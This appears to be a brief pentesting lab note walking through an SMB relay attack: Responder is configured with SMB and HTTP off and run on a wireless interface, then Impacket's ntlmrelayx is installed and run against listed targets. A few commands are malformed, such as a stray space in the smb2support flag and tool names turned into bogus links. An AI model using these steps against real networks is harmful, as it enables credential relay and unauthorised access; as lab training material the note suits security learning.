# SMB Relay Attack Demonstration Part 1

mousepad /etc/responder/Responder.conf

and change the SMB and HTTP to Off. check by typing the command "responder -I wlan0 -wdv"&#x20;

do not close it and form another terminal do below

{% embed url="https://hausec.com/how-to-set-up-ntlmrelayx-py/" %}

sudo su

ntlmrelay.py -tf target.txt - smb2support                                    &#x20;

&#x20;   \[target.txt only contains the ip address]





if above instruction to install somehow failed then use the below method.&#x20;

Step 1: Install Required Dependencies sudo apt update && sudo apt install -y python3 python3-pip git libssl-dev libffi-dev python3-dev \[Before installing Impacket, ensure your system has the necessary dependencies]&#x20;

Step 2: Clone and Install Impacket&#x20;

git clone [https://github.com/fortra/impacket.git](https://github.com/fortra/impacket.git)&#x20;

cd impacket&#x20;

Step 3: Verify Installation [ntlmrelayx.py](https://ntlmrelayx.py/) -h \[If you see the help menu, the installation was successful.] Step 4: Running sudo [ntlmrelayx.py](https://ntlmrelayx.py/) -tf target.txt -smb2support
